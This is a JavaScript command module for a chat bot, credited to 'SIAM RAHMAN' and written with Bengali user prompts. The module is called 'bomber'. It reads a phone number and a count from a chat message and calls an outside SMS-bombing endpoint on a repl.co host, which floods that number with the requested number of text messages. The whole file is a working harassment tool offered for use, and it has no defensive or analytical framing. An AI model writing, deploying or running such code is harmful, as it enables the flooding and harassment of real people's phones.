module.exports.config = {
	name: "bomber",
	version: "1.0.1",
	hasPermssion: 2,
	credits: "SIAM RAHMAN",
	description: "",
	commandCategory: "system",
	usages: "bomber",
	cooldowns: 0
};

module.exports.run = async function({ api, args, event, __GLOBAL }) {
    const text = args.join(" ");
    if (!text) return api.sendMessage('- 🤓 { সিয়াম বোম্বার } - এ আপনাকে স্বাগতম 🤓 \n -এইভাবে নম্বর এবং পরিমাণ লিখুন => [নম্বর - পরিমাণ] ‼️ \n \n - {   সিয়াম রহমান   } ', event.threadID, event.messageID);
  
    if (!text.includes(' - ')) return api.sendMessage('অনুগ্রহ করে "-" বিভাজক অন্তর্ভুক্ত করুন ফোন এবং পরিমাণ এর মাঝামাঝিতে‼️ \n \n - {   সিয়াম রহমান   } ', event.threadID, event.messageID);
  
    const length_0 = parseInt(text.length);
    const phone = text.substr(0, text.indexOf(' - '));
    if (!phone) return api.sendMessage('অনুগ্রহ করে পরিমাণ লিখুন ‼️', event.threadID, event.messageID);
  
    const length = parseInt(phone.length);
    const amount = text.slice(length + 2);
    api.sendMessage(`- এসএমএস পাঠানো শুরু হয়েছে🤓 \n - পরিমাণ : ${amount}✅`, event.threadID, event.messageID);
    // Make a GET request to the API
const response = await fetch(`https://sms-server.siamapi.repl.co/?phone=${phone}&amount=${amount}`);
    
    // Check the status code of the response
    if (response.status === 200) {
      api.sendMessage('- এসএমএস পাঠানো সম্পূর্ণ হয়েছে✅ \n \n - {   সিয়াম রহমান   } ', event.threadID, event.messageID);
    } else {
      api.sendMessage(`- এসএমএস পাঠানো সম্পূর্ণ হয়নি⚠️ \n - স্ট্যাটাস কোড : ${response.status}❌ \n \n - {   সিয়াম রহমান   } `, event.threadID, event.messageID);
    }
  }
  